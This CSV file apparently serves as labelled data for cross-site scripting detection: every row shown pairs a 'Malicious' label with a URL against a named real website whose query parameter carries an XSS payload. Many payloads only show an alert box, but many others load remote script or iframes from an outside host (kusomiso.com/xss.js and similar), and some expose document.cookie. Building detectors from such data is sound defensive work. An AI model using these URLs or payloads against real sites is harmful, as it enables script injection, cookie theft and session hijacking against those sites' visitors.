Payloads,Class
http://www.clubsnsw.com.au/default.jsp?xcid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.gamesunlimited.com.my/jsp/default.jsp?model=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://techinfo.subaru.com/html/search.jsp?publication_type=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.calpers.ca.gov/index.jsp?bc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.emc.com/global_services/support/clariion_support/index.jsp?openfolder=&quot;&gt;&lt;script&gt;alert(&quot;ma<br>xwel&quot;)&lt;/script&gt;,Malicious
http://www.visit-trondheim.com/index.jsp?csl=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.smilebox.com/about/index.jsp?partner=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.csd.uoc.gr/index.jsp?tid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://non-educational.pbwiki.com/findpage?searchfor=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://discuss.princetonreview.com/searchpro.asp?searchfor=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://ms103.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://ms106.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://ms110.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://ms112.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://ms128.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://ms132.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://ms140.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://ms144.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://ms146.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://ms148.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://ms152.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://ms154.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://ms158.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://ms164.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://ms168.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e,Malicious
http://www.nationalarchives.ie/search/index.php?category=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.suncompany.net/subcategory.php?subcategory=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.sailing.org/newssearch.asp?searchtype=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.worldshakesbib.org/search?searchtype=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.lq.com/lq/proxysearch.do?searchstate=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://atwork.nypost.com/careers/jobsearch/results?kandentire=%22%3e%3cscript%3ealert%28%22maxwel%22<br>%29%3c%2fscript%3e&amp;categorieslist1%5b0%5d=&amp;fromsearch_x=35&amp;fromsearch_y=5,Malicious
http://www.certifiedpt.org/index.cfm?section=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://distance.wsu.edu/courses/catalog/index.asp?g=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.halfvalue.com/searchresultsallbhvoa.jsp?type=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://scop.mrc-lmb.cam.ac.uk/scop/search.cgi?key=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://dag.wieers.com/scripts/search.cgi?file=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.cbc.ca/programguide/program/index.jsp?program=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.privateproperty.co.za/search/prov.asp?listtype=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.mindat.org/rloc.php?loc=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://ejournals.ebsco.com/info/ejstitles.asp?txtsearch=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://spektri.oph.fi/svenska/txtsearch.asp?path=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://clubsnsw.com.au.tmp.anchor.net.au/search.jsp?xcid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.stardeveloper.com/articles/default.jsp?article_id=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.un.org.yu/news.jsp?id=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.ontopia.net/omnigator/models/topic_complete.jsp?tm=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.lpg.es/includes/news/new.jsp?newsid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://traductor.gencat.net/jsp/help-url.jsp?locale=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.biohealthbase.org/gsearch/news.jsp?decorator=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.istituticulturali.it/moduli/news/news.jsp?sn=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.elite-it.com/jsp/news.jsp?lang=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://gvtags.berlios.de/cgi-bin/gvtagswiki.pl?action=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://ccsd.msoe.edu/news.jsp?page=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://aaadir.com/banks/branch/add/new.jsp?bank_id=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://shop3.mailordercentral.com/tibetmerchandise/products.asp?dept=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scri<br>pt&gt;,Malicious
http://food.itv.com/cooks/main.php?section=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.robby.gr/new.pl?lang=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.autoresurs.sk/cgi-bin/conf/post/new.pl?conf=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.autoresurs.cz/cgi-bin/conf/post/new.pl?conf=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.em.gov.lv/em/2nd/?cat=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.sfgate.com/cgi-bin/blogs/sfgate/category?blogid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.apache.ru/webboard/index.html?n1=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://my.qxl.no/search/searchelse.asp?txtsearch= --&gt;&lt;script&gt;alert(/maxwel/)&lt;/script&gt;,Malicious
http://www.iaald.org/index.php?page=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://commonground.mines.edu/context_help.cgi?help=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://images.zwire.com/site/js/dmenu/?brd=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.kqed.org/programs/program-landing.jsp?progid=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.eng.tohoku.ac.jp/english/program/?menu=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://propaganda.netdiscounter.de/shop/cgi-bin/artikel.asp?gruppe1=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/scrip<br>t&gt;,Malicious
http://www.nsf.org/business/athletic_banned_substances/participation.asp?program=&quot;&gt;&lt;script&gt;alert(&quot;ma<br>xwel&quot;)&lt;/script&gt;,Malicious
http://www.sportscharities.org/info.asp?stopimg=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/script&gt;,Malicious
http://www.alexa.com/data/details/traffic_details?url=http://www.xssed.com/%22%3e/%3e'%3e%3cscript%3<br>e%3c/script%3e%3cimg%20src=no_such_icon%20onerror=alert(document.cookie);%3e%3cscript%3ealert(%22kus<br>omiso.com%22)%3c/script%3e,Malicious
http://www.newcracks.net/index.php?shuk=%22%3e'%3e%3cscript%3ealert(%22kusomiso.com%22)%3c/script%3e,Malicious
http://jigsaw.w3.org/css-validator/validator?uri=http://kusomiso.com/%22%3e'%3e%3cscript%3ealert(%22<br>kusomiso.com%22)%3c/script%3e,Malicious
http://www.excite.co.jp/world/chinese/web/proceeding/?wb_url=http%3a%2f%2fkusomiso.com%2f%22%3e%27%3<br>e%3cscript%3ealert%28%22kusomiso.com%22%29%3c%2fscript%3e&amp;wb_submit=%e3%82%a6%e3%82%a7%e3%83%96%e3%8<br>3%9a%e3%83%bc%e3%82%b8%e7%bf%bb%e8%a8%b3&amp;wb_lp=chja,Malicious
http://ad-click.jp/members/help.php?ssid='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/sc<br>ript%3e,Malicious
http://myboard.jp/i/bbs/list.php?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%<br>3e,Malicious
http://www.twotop.co.jp/simple/search.asp?qu=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso%2ec<br>om%2fx%2ejs%3e%3c%2fscript%3e%0d%0a,Malicious
http://stock.dir.co.jp/chartframe.asp?mcode='%3e%22%3e%3cscript/src=http://kusomiso.com/x.js%3e%3c/s<br>cript%3e&amp;market=j&amp;day=1&amp;week=1&amp;month=1&amp;type=a&amp;lang=j,Malicious
http://over.com/parking.php4?task=search&amp;domain=over.com&amp;trackquery=1&amp;s=8c40d17ebd9d6029690b&amp;tb=0&amp;a_<br>id=1&amp;language=en&amp;pgt=3pqi78v4f1akewj9jcgxzbeoahuinwckhreuaugyayaamirwoam4hg&amp;pxy_t=0&amp;start=1&amp;add_c=ce<br>d382b8d56ac19057c96183b5f53e63&amp;x=0&amp;y=0&amp;keyword=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.c<br>om%2fxss.js%3e%3c%2fscript%3e,Malicious
http://k-2ch.net/orz/orz.cgi/z4377n/wwwww.2ch.net/f1/%22%3e'%3e'%3c%22'%3e%22%3e'%3e%3cscript%3ealer<br>t(%22xss%20by%20kusomiso.com%22)%3c/script%3e,Malicious
http://nid.naver.com/nidlogin.login?mode=form&amp;url='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js<br>%3e%3c/script%3e,Malicious
http://new.megabbs.com/cgi-bin/readres.cgi?bo=erov&amp;vi=1064912410&amp;rs=&amp;res=&amp;search=%27%3e%22%3e%3cscri<br>pt%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fx.js%3e%3c%2fscript%3e,Malicious
http://www.photos.com/en/search/index?srch=search&amp;k_var=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fk<br>usomiso.com%2fx.js%3e%3c%2fscript%3e,Malicious
http://www.thinkstockfootage.com/product/search?keyword=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fk<br>usomiso.com%2fx.js%3e%3c%2fscript%3e&amp;go.x=0&amp;go.y=0,Malicious
http://keygen.com/%27%3e%22%3e%3cscript/src%3dhttp%3a//kusomiso.com/x.js%3e%3c/script%3e.cfm?pt=2&amp;vi<br>d=1189498414_1x04x1345589021&amp;rpt=1&amp;kt=1,Malicious
http://dkjfwekjnc4.com/home.php?l=en&amp;token=-d7sdxv3pzqkewifzn6e7buoahugawukhup9euqyayaamivwoam4fq&amp;q=<br>%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fxssbykusomiso.js%3e%3c%2fscript%3e,Malicious
http://www.viaverio.com/index.cfm?page_id=7&amp;keywords='%3e%22%3e%3cscript/src=http://kusomiso.com/xss<br>.js%3e%3c/script%3e,Malicious
http://3deg.net/~orz2ch/orz/orz.cgi/-/kusomiso.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kus<br>omiso.com%22)%3c/script%3e,Malicious
http://backup.vip2ch.com/orz/orz.cgi/-/kusomiso.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20ku<br>somiso.com%22)%3c/script%3e,Malicious
http://bonsoleil.mine.nu/orz/orz.cgi/-/kusomiso.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20ku<br>somiso.com%22)%3c/script%3e,Malicious
http://danno003.u.la/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.com%<br>22)%3c/script%3e,Malicious
http://droppi.dyndns.org/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusom<br>iso.com%22)%3c/script%3e,Malicious
http://danno005.u.la/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.com%<br>22)%3c/script%3e,Malicious
http://hatomune.com/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)%3c/script%3e,Malicious
http://hogehoge.s11.coreserver.jp/orz/orz.cgi/-/xssed.com/'%3e%22%3e'%3e%3cscript%3ealert(%22xss%22)<br>%3c/script%3e,Malicious
http://lt.boincstats.com/search/result.php?searchname='%3e%22%3e%3ciframe%20src=http://kusomiso.com/<br>xss.html%20%3c,Malicious
http://de.boincstats.com/search/result.php?searchname='%3e%22%3e%3ciframe%20src=http://kusomiso.com/<br>xss.html%20%3c,Malicious
http://fr.boincstats.com/search/result.php?searchname='%3e%22%3e%3ciframe%20src=http://kusomiso.com/<br>xss.html%20%3c,Malicious
http://boincstats.com/search/result.php?searchname='%3e%22%3e%3ciframe%20src=http://kusomiso.com/xss<br>.html%20%3c,Malicious
http://www.4k.cc/search/index.php?word=%22%3e%3cscript/src=http://kusomiso.com/x.js%3e%3c/script%3e,Malicious
http://www.edu-net.jp/gakko/fujimigaoka_y/f_shiryo/thanks.php?name=i&amp;kana_name='%3e%22%3e'%3e%3cscri<br>pt%3ealert(%22x%22)%3c/script%3e,Malicious
http://srash.com/search.php?term='%3e%22%3e%3cscript/src=http://kusomiso.com/x.js%3e%3c/script%3e,Malicious
http://ice.lv3.net/test/r.cgi/'%3e%22%3e%3cimg%20src=no_such_icon%20onerror=alert(document.cookie);%<br>3e%3cmarquee%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e%3c/marquee%3e,Malicious
http://www.various-info.net/ff11/itemsearch.cgi?itemname=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2f<br>kusomiso.com%2fx.js%3e%3c%2fscript%3e&amp;submit=%83t%81%5b%83%60,Malicious
http://zakka-zakka.net/item/search.php?wd=%22%3e'%3e%22%3c'%3c%3cscript%3e%3c/script%3e'%%3c'%3e%22%<br>3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://music.aladdin.co.kr/search/wsearchresult.aspx?searchword='%3e%22%3e%3cscript/src=http://kusom<br>iso.com/xss.js%3e%3c/script%3e,Malicious
http://ss.iodata.jp/pio/matchbody?keyword=hello_xss_by_kusomiso.com&amp;release=19'%3e%22%3e%3cscript/sr<br>c=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.netyokocho.jp/yokocho/syohin/?search=10&amp;text=%22%3e'%3e%22%3c'%3c%3cscript%3e%3c/script%3<br>e'%%3c'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e&amp;kensaku=%22%3e'%3e%22%3c'%3<br>c%3cscript%3e%3c/script%3e'%%3c'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://arcade.games.myway.com/game.htm?code=111956893&amp;refid=1000'%3e%22%3e%3cscript/src=http://kusom<br>iso.com/xss.js%3e%3c/script%3e,Malicious
http://47.xmbs.jp/login.php?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://n.xmbs.jp/n.php?id=kyoufu&amp;c_num=13756'%3e%22%3e%3cscript/src=http://kusomiso.com/x.js%3e%3c/s<br>cript%3e&amp;no=53677&amp;view=1&amp;page=2,Malicious
http://b.xmbs.jp/b2.php?id=kyoufu&amp;no=8899800'%3e%22%3e%3cscript/src=http://kusomiso.com/x.js%3e%3c/s<br>cript%3e&amp;c_num=63525,Malicious
http://tool.studio-x1.com/viewer/index.php?site='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3<br>e%3c/script%3e,Malicious
http://1.tool.ms/pwmail.cgi?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://1.tool.ms/new.cgi?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://2.tool.ms/new.cgi?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://2.tool.ms/snchange.cgi?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://2.tool.ms/restore.cgi?id='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://locoboard.jp/delete.php?id=test&amp;no='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/s<br>cript%3e,Malicious
http://boincstats.com/stats/project_graph.php?pr='%3e%22%3e%3ciframe%20src=http://kusomiso.com/xss.h<br>tml%20%3c,Malicious
http://locoboard.jp/pass.php?mode=pass&amp;id=&amp;mail='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3<br>e%3c/script%3e,Malicious
http://locoboard.net/pass.php?mode=pass&amp;id=&amp;mail='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%<br>3e%3c/script%3e,Malicious
http://www.marsflag.com/search.x?phrase=japan&amp;mode='%3e%22%3e%3cscript/src=http://kusomiso.com/xss.j<br>s%3e%3c/script%3e,Malicious
"http://www.faith-go.co.jp/lists/itemlist3_soft.asp?cid=00026&amp;fl=1,2,3&amp;n_name=vocaloid2%22%3e'%3e%3c/<br>script%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/script%3e",Malicious
http://www.police.qld.gov.au/station-locator/searchresults.asp?suburb='%3e%22%3e%3cscript/src=http:/<br>/kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.blog-bell.com/s.php?word=%3c/title%3e'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3<br>e%3c/script%3e&amp;rows=20&amp;category=all&amp;submit=%8c%9f%8d%f5,Malicious
http://www.jcv-jp.org/supporters/introduct/introduct_list.php?pstat=&amp;ptype='%3e%22%3e%3cscript/src=h<br>ttp://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://2churl.net/qa/%3ciframe%20src=javascript:alert('xss');%3e%3c/iframe%3e,Malicious
http://pl.boincstats.com/bam/register.php?email=%22%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e&amp;name=%22%3e<br>%3ch1%3eby%20kusomiso.com%3c/h1%3e,Malicious
http://es.boincstats.com/bam/register.php?email=%22%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e&amp;name=%22%3e<br>%3ch1%3eby%20kusomiso.com%3c/h1%3e,Malicious
http://ct.boincstats.com/bam/register.php?email=%22%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e&amp;name=%22%3e<br>%3ch1%3eby%20kusomiso.com%3c/h1%3e,Malicious
http://boincstats.com/bam/register.php?email=%22%3e%3ch1%3eby%20kusomiso.com%3c/h1%3e&amp;name=%22%3e%3c<br>h1%3eby%20kusomiso.com%3c/h1%3e,Malicious
http://tw.boincstats.com/stats/project_graph.php?pr='%3e%22%3e%3ciframe%20src=http://kusomiso.com/xs<br>s.html%20%3c,Malicious
http://ct.boincstats.com/stats/project_graph.php?pr='%3e%22%3e%3ciframe%20src=http://kusomiso.com/xs<br>s.html%20%3c,Malicious
http://fi.boincstats.com/stats/project_graph.php?pr='%3e%22%3e%3ciframe%20src=http://kusomiso.com/xs<br>s.html%20%3c,Malicious
http://www.pc-koubou.jp/goods/search.php?s=75&amp;g=19&amp;c=50%22%3e'%3e%3cscript%3ealert('xss')%3c/script%<br>3e,Malicious
http://www.excite.co.jp/bbs/blog/technic/thread?mode=id&amp;t=1143553'%3e%22%3e%3cscript/src=http://kuso<br>miso.com/xss.js%3e%3c/script%3e&amp;m=1&amp;submit22=%95%5c%8e%a6,Malicious
http://www1.ntv.co.jp/mobile/weblog/oha4/index.cgi?id=21&amp;mode=individual&amp;no=8'%3e%22%3e%3cscript/src<br>=http://kusomiso.com/xss.js%3e%3c/script%3e&amp;eid=2178,Malicious
http://www.designtaxi.com/news.jsp?id=7191&amp;monthview=1&amp;month=2&amp;year='%3e%22%3e%3cscript/src=http://k<br>usomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.designtaxi.com/forum/topic.jsp?id=572'%3e%22%3e%3ciframe%20src=http://kusomiso.com/xss.ht<br>ml%20%3c,Malicious
http://2.tool.ms/google.cgi?id=kusomiso.com%3c/title%3e'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%2<br>0kusomiso.com%22)%3c/script%3e,Malicious
http://3.tool.ms/google.cgi?id=kusomiso.com%3c/title%3e'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%2<br>0kusomiso.com%22)%3c/script%3e,Malicious
http://news.youtubech.com/i/%3ciframe%20src=javascript:alert('xss');%3e%3c/iframe%3e,Malicious
http://www.azr.ne.jp/aozoracgi/cgi/src/aozorasrh.cgi?whence=0&amp;max=20&amp;result=normal&amp;sort=score&amp;query=<br>'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.com%22)%3c/script%3e,Malicious
http://www3.vis.ne.jp/~asaki/p_diary/diary.cgi?year=2007&amp;month=09&amp;day=11'%3e%22%3e%3cscript/src=http<br>://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://nonki.ffvv.net/diary/2007/%3c/title%3e%22%3e'%3e%3cscript%3ealert('xss')%3c/script%3e/,Malicious
http://rinn.e-site.jp/bbs/%22%3e'%3e%3cscript%3ealert('xss')%3c/script%3e/,Malicious
http://www.thainavigation.com/longstay_top.php?longstay_id=1'%3e%22%3e%3ciframe%20src=http://kusomis<br>o.com/xss.html%20%3c,Malicious
http://www.thaiokoku.com/link/rank.php/'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3e%3c/scri<br>pt%3e,Malicious
http://tic-ket2.com/link?mode=dir&amp;path=01/01/02/'%3e%22%3e%3cscript/src=http://kusomiso.com/xss.js%3<br>e%3c/script%3e,Malicious
http://pc.happymail.co.jp/index_2.php?log=%22%3e'%3e%3c/iframe%3e%3cscript/src=http://kusomiso.com/x<br>ss.js%3e%3c/script%3e,Malicious
http://ym.to/i/m/search.cgi?ky=%27%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fxss.js%3e%3<br>c%2fscript%3e&amp;sp=1&amp;md=1,Malicious
http://www.ro2.jp/search/index.php?mixquery=xss_by_kusomiso.com&amp;mixreqid='%3e%22%3e%3cscript/src=htt<br>p://kusomiso.com/xss.js%3e%3c/script%3e&amp;charset=shift_jis&amp;mixaction=newsearch&amp;submit.x=27&amp;submit.y=1<br>8&amp;submit=%b8%a1%ba%f7,Malicious
http://www.sakamoto.or.jp/cgi-bin/diary/diary.cgi?year=2007&amp;month=10&amp;day=8'%3e%22%3e%3cscript/src=ht<br>tp://kusomiso.com/xss.js%3e%3c/script%3e,Malicious
http://www.fureai.or.jp/~peipei/blog/index.cgi/help/%22%3e'%3e%3ciframe%20src=javascript:alert('xss'<br>);%3e%3c/iframe%3e,Malicious
http://www.sky-love.net/adduserrule.asp?dmy=1&amp;sex=99%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e,Malicious
http://www.jrc.or.jp/newinfo/list.cgi?start=%22%3e'%3e%3cscript%3ealert('x')%3c/script%3e,Malicious
http://www.minami.co.jp/ss/shop.cgi?mode=40'%3e%22%3e'%3e%3cscript%3ealert(%22xss%20by%20kusomiso.co<br>m%22)%3c/script%3e,Malicious
http://www.webftp.sk/index.php?server=%22%3e%27%3e%22%3c%27%3c%3cscript%3e%3c%2fscript%3e%27%25%3c%2<br>7%3e%22%3e%3cscript%2fsrc%3dhttp%3a%2f%2fkusomiso.com%2fxss.js%3e%3c%2fscript%3e&amp;port=21&amp;user=&amp;passw<br>ord=,Malicious
http://www.csl.sony.co.jp/cgi-bin/hyperrfc?%3c/title%3e'%3e%22%3e%3cscript/src=http://kusomiso.com/x<br>ss.js%3e%3c/script%3e,Malicious
http://www.yokkaichichuo-th.ed.jp/~h18it04/weblog/weblog.cgi?year=2007&amp;month=10'%3e%22%3e%3cscript/s<br>rc=http://kusomiso.com/xss.js%3e%3c/script%3e3e,Malicious
http://www.xixixi.jp/xixixi2/j/mmenu.php?scd=1&amp;qs=scd=1&amp;qs=&amp;idp='%3e%22%3e%3cscript/src=http://kusom<br>iso.com/xss.js%3e%3c/script%3e&amp;kno=,Malicious
